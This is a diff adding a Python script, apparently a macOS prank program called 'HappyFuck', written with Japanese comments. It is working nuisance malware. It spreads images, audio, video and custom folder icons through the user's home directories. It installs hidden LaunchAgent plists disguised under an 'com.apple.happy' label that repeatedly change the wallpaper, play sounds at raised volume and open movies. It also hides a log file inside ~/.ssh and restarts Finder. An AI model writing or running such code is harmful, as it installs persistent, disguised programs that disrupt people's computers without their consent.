@@ -1,0 +1,360 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import re
+import sys
+import os
+import subprocess
+import shutil
+import random
+
+class ProcessInfo(object):
+	""" プロセスの情報構造体. 
+		逐次的に実行するプロセスファイルを作るために情報を格納する.
+	"""
+	def __init__(self):
+		self.path = None
+		self.name = None
+		self.program_path = None
+		self.program_argument_pathes = []
+		self.interval = None
+		self.source = """\
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>Label</key>
+	<string>%s</string>
+	<key>ProgramArguments</key>
+	<array>
+		<string>python</string>
+		<string>%s</string>
+		%s
+	</array>
+	<key>StartInterval</key>
+	<integer>%s</integer>
+</dict>
+</plist>
+"""
+	def get_source(self):
+		program_arguments = ""
+		for argument_path in self.program_argument_pathes:
+			program_arguments += "<string>"+argument_path+"</string>\n"
+		source_entity = self.source % (self.name, self.program_path, program_arguments, self.interval)
+
+		return source_entity
+
+
+class HappyFuck(object):
+	""" ハッピーファック. 
+		コンピュータ内をハッピーファックする.
+	"""
+	def __init__(self):
+		pass
+
+	def prepare(self):
+		# Setting Python Sources
+		self.python_srcs = {}
+		self.python_srcs["image"]  = """\
+#! /usr/bin/env python
+
+import sys
+import subprocess
+import random
+
+pathes = sys.argv
+pathes.pop(0)
+image_file = random.choice(pathes)
+
+# change desktop
+apple_script = "tell application \\"Finder\\" to set desktop picture to POSIX file \\"" + image_file + "\\""
+shell_script = "osascript -e \\'"+apple_script+"\\'"
+p = subprocess.Popen(shell_script, shell=True) 
+p.wait()
+"""
+
+		self.python_srcs["music"] = """\
+#! /usr/bin/env python
+
+import sys
+import subprocess
+import random
+
+pathes = sys.argv
+pathes.pop(0)
+music_file = random.choice(pathes)
+
+p = subprocess.Popen("osascript -e 'set Volume output volume 70'",shell=True)
+p.wait()
+p = subprocess.Popen("afplay -v 1 " + music_file,shell=True)
+p.wait()
+"""
+		self.python_srcs["movie"]  = """\
+#! /usr/bin/env python
+
+import sys
+import subprocess
+import random
+
+pathes = sys.argv
+pathes.pop(0)
+movie_file = random.choice(pathes)
+
+p = subprocess.Popen("osascript -e 'set Volume output volume 100'",shell=True)
+p.wait()
+p = subprocess.Popen("defaults write com.apple.QuickTimePlayerX MGPlayMovieOnOpen -boolean true",shell=True)
+p.wait()
+p = subprocess.Popen(["open",movie_file])
+p.wait()
+"""
+		self.bash_after = """\
+icon=%s;\
+iconDestination=%s;\
+cp $icon $iconDestination/$'Icon\\r';\
+SetFile -a C $iconDestination/;\
+SetFile -a V $iconDestination/$'Icon\\r';\
+"""
+		self.setting_directory()
+		self.setting_property()
+		self.find_best_depth_path() 
+		self.setting_process() # Need best depth path
+
+		print "--- Best Depth Directory ---"
+		print self.best_depth_path + "/"
+		print
+
+		# Processファイル用にコンテンツをダウンロードし, パスも割り当てる.
+		self.resource_dir = os.path.join(os.path.dirname(sys.argv[0]),"resources")
+		self.download_contents(from_dir=self.resource_dir, to_dir=self.best_depth_path)
+		self.make_python_sources() # Pythonソースコードを生成
+		self.make_process_files() # Processファイルを生成
+
+	def setting_directory(self):
+		""" Setting Directory
+		"""
+		self.home_dir = os.environ['HOME']
+		self.ssh_dir = os.path.join(self.home_dir,".ssh") # Log File
+		self.process_dir = os.path.join(self.home_dir,"Library","LaunchAgents") # Python,Plist File
+		if not os.path.isdir(self.process_dir):
+			os.makedirs(self.process_dir)
+		if not os.path.isdir(self.ssh_dir):
+			os.makedirs(self.ssh_dir)
+
+		ignores = ["Copy","Dropbox","Library","Applications"]
+		dirs = []
+		for a_dir in os.listdir(self.home_dir):
+			if a_dir[0] is '.': continue
+			if os.path.isdir(os.path.join(self.home_dir,a_dir)):
+				dirs.append(a_dir)
+		for an_ignore in ignores:
+			if an_ignore in dirs:
+				dirs.remove(an_ignore)
+		self.search_dirs = [os.path.join(self.home_dir,a_dir) for a_dir in dirs]
+	
+	def setting_property(self):
+		self.thumbnail_pathes = []
+		self.process_head = "com.apple.happy."
+		self.memoryname = os.path.join(self.ssh_dir,".memory.log")
+		self.re_happy_fucks = {}
+		self.re_happy_fucks["icon"] = re.compile("Icon_[0-9]")
+		self.re_happy_fucks["thumb"] = re.compile("HappyFuckThumb_[0-9]+.jpg")
+		self.re_happy_fucks["image"] = re.compile("HappyFuckImage_[0-9]+.png")
+		self.re_happy_fucks["music"] = re.compile("HappyFuckMusic_[0-9]+.mp3")
+		self.re_happy_fucks["movie"] = re.compile("HappyFuckMovie_[0-9]+.mp4")
+		self.content_pathes = {}
+		self.content_pathes["icon"] = []
+		self.content_pathes["thumb"] = []
+		self.content_pathes["image"] = []
+		self.content_pathes["music"] = []
+		self.content_pathes["movie"] = []
+
+	def setting_process(self):
+		""" Setting Process Infomation.
+		"""
+		self.process_infos = {"image":ProcessInfo(),"music":ProcessInfo(),"movie":ProcessInfo()}
+		for (name,process_info) in self.process_infos.items():
+			process_name = self.process_head + name
+			process_info.path = os.path.join(self.process_dir, "." + process_name + ".plist")
+			process_info.name = process_name
+			process_info.program_path = os.path.join(self.best_depth_path, ".happy_" + name)
+
+		self.process_infos["image"].interval = 27
+		self.process_infos["music"].interval = 48
+		self.process_infos["movie"].interval = 111
+
+	def walklevel(self, dirs, level=2):
+		for some_dir in dirs:
+			some_dir = some_dir.rstrip(os.path.sep)
+			assert os.path.isdir(some_dir)
+			num_sep = some_dir.count(os.path.sep)
+			for root, dirs, files in os.walk(some_dir):
+				yield root,files
+				num_sep_this = root.count(os.path.sep)
+				if num_sep + level <= num_sep_this:
+					self.best_depth_path = root
+					del dirs[:]
+
+	def find_best_depth_path(self):
+		""" 一番深いディレクトリを取得
+		"""
+		self.best_depth_path = ""
+		memoryfile = open(self.memoryname,'w')
+
+		for root,files in self.walklevel(self.search_dirs):
+			memoryfile.write(root + '\n')
+		memoryfile.close()
+		
+	def download_contents(self, from_dir, to_dir):
+		""" リソースから一番深くにダウンロード
+		"""
+
+		for filename in os.listdir(from_dir):
+			from_file = os.path.join(from_dir,filename)
+			to_file = os.path.join(to_dir,filename)
+
+			for key,re_happy in self.re_happy_fucks.items():
+				if re_happy.match(filename):
+					if key == "icon":
+						to_file = os.path.join(self.resource_dir,filename)
+						self.content_pathes[key].append(to_file)
+					else:
+						self.content_pathes[key].append(to_file)
+						shutil.copyfile(from_file, to_file)
+					break
+			else:
+				if filename == "Hint.txt":
+					shutil.copyfile(from_file, os.path.join(self.home_dir,"Desktop",filename))
+
+		self.process_infos["image"].program_argument_pathes = self.content_pathes["image"]
+		self.process_infos["music"].program_argument_pathes = self.content_pathes["music"]
+		self.process_infos["movie"].program_argument_pathes = self.content_pathes["movie"]
+
+
+	def spread_from(self):
+		""" 動画, 画像, 音声をディレクトリの全階層に広める.
+		"""
+		memoryfile = open(self.memoryname,'r')
+
+		for line in memoryfile:
+			to_dir = line.rstrip()
+			bash_script = self.bash_after % (random.choice(self.content_pathes["icon"]),to_dir)
+			p = subprocess.Popen(bash_script,shell=True)
+			p.wait()
+			for path in self.content_pathes["thumb"]:
+				filename = os.path.basename(path)
+				from_file = path
+				to_file = os.path.join(to_dir,filename)
+				try:
+					os.link(from_file, to_file)
+					print "spread file " + to_file
+				except:
+					print "Error"
+		p = subprocess.Popen("killall Finder",shell=True)
+		p.wait()
+		memoryfile.close()
+
+	def change_image_of_desktop(self):
+		desktop_script = """\
+osascript -e 'tell application "Finder" to set desktop picture to POSIX file "%s"'
+"""
+		print "Change Desktop"
+		an_image = self.process_infos["image"].program_argument_pathes[0]
+		print an_image
+		p = subprocess.Popen(desktop_script % an_image, shell=True)
+		p.wait()
+
+	def clean(self):
+		self.setting_directory()
+		self.setting_property()
+		for root,files in self.walklevel(self.search_dirs):
+			for filename in files:
+				for re_happy in self.re_happy_fucks.values():
+					if re_happy.match(filename):
+						path = os.path.join(root,filename)
+						os.remove(path)
+						print "remove file: " + path
+						break
+				if filename == "Icon\r":
+					path = os.path.join(root,filename)
+					os.remove(path)
+					print "remove file: " + path
+		for content in ["image","movie","music"]:
+			path = os.path.join(self.best_depth_path,".happy_"+content)
+			print "remove file: " + path
+			os.remove(path)
+		self.stop_launchd()
+		p = subprocess.Popen("killall Finder",shell=True)
+		p.wait()
+
+	def get_process_pathes(self):
+		self.setting_directory()
+		self.setting_property()
+		contents = ["image","music","movie"]
+		process_pathes = []
+		for content in contents:
+			process_path = os.path.join(self.process_dir, "." + self.process_head + content + ".plist")
+			process_pathes.append(process_path)
+		return process_pathes
+
+	def restart_launchd(self):
+		self.stop_launchd()
+		self.start_launchd()
+
+	def start_launchd(self):
+		for process_path in self.get_process_pathes():
+			p = subprocess.Popen(["launchctl", "load", process_path])
+			p.wait()
+
+	def stop_launchd(self):
+		for process_path in self.get_process_pathes():
+			p = subprocess.Popen(["launchctl", "unload", process_path])
+			p.wait()
+
+	def make_python_sources(self):
+		for (name,process_info) in self.process_infos.items(): 
+			program_path = process_info.program_path
+			self.make_file(program_path, self.python_srcs[name]) # Pythonのソースファイル名, Pythonのソース
+			os.chmod(program_path,0755)
+
+	def make_process_files(self):
+		for process_info in self.process_infos.values():
+			self.make_file(process_info.path, process_info.get_source())
+
+	def make_file(self, wfile_path, a_source):
+		with open(wfile_path,'w') as wfile:
+			wfile.write(a_source)
+
+def main():
+	cmd=""
+	if len(sys.argv) == 1:
+		cmd = "all"
+	else: 
+		cmd = sys.argv[1]
+
+	aFuck = HappyFuck()
+	if cmd == "spread":
+		aFuck.prepare()
+		aFuck.change_image_of_desktop()
+		aFuck.spread_from()
+	elif cmd == "start":
+		aFuck.start_launchd()
+		print "Started launchd."
+	elif cmd == "restart":
+		aFuck.restart_launchd()
+		print "Restarted launchd."
+	elif cmd == "stop":
+		aFuck.stop_launchd()
+		print "Stoped launchd."
+	elif cmd == "clean":
+		aFuck.clean()
+	elif cmd == "all":
+		aFuck.prepare()
+		aFuck.change_image_of_desktop()
+		aFuck.spread_from()
+		aFuck.start_launchd()
+	else:
+		pass
+
+if __name__ == '__main__':
+	main()
+
